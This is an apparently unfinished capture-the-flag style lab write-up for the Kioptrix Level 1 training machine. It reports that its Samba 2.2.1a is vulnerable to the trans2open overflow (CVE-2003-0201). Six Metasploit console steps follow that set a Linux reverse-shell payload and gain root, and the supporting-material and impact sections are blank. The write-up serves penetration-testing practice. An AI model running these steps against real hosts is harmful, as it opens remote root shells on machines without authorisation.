# Kioptrix L1: Privilege Escalation using Samba Version

## Summary:
Due to the available version of Samba in Kioptrix, an attacker after enumerate this service can escalate root privileges.

## Technical Details:
The available version of Samba found is 2.2.1a is vulnerable to a buffer overflow called **trans2open** according to this **Common Vulnerabilities and Exposure 2003-0201 [(CVE-2003-0201)](https://www.cvedetails.com/cve/CVE-2003-0201/)** 
using arbitraty code -a payload for example- it is possible to obtain root privileges. 

##Steps to reproduce using metasploit and a terminal:
1) msfconsole
2) search trans2open
3) use 1
4) set RHOSTS <ip_of_kioptrixl1>
5) set payload linux/shell_reverse_tcp
6) run

##Supporting Material:

##Impact: